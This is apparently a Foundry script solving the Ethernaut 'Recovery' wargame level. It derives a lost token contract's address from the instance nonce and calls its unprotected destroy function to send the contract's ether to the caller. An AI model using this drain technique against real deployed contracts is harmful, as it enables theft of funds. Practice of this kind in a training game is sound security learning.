// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Script } from "forge-std/script.sol";
import { console } from "forge-std/console.sol";

import { SimpleToken } from "src/Recovery/Recovery.sol";

import { addressFrom } from "src/utils/addressFrom.sol";

contract RecoveryAttackScript is Script {
    address public recoveryInstance = address(0xefB31C72d33EB40191118194d41f7D10eb8FE1D5);

    function run() public {
        vm.startBroadcast();
        uint256 instanceNonce = vm.getNonce(recoveryInstance);
        // had to use a two here since I was messing around on the ethernaut console and created a second contract.
        // normally you should be able to get away with using "- 1"
        address lostTokenAddress = addressFrom(recoveryInstance, instanceNonce - 2);

        console.log("Instance Nonce:", instanceNonce);
        console.log("Lost Token Address:", lostTokenAddress);
        
        uint256 beforeBalance = lostTokenAddress.balance;
        // destroy the "lost" contract and send the ether elsewhere
        SimpleToken(payable(lostTokenAddress)).destroy(payable(msg.sender));
        uint256 afterBalance = lostTokenAddress.balance;
        assert(beforeBalance > afterBalance);
        vm.stopBroadcast();
    }
}
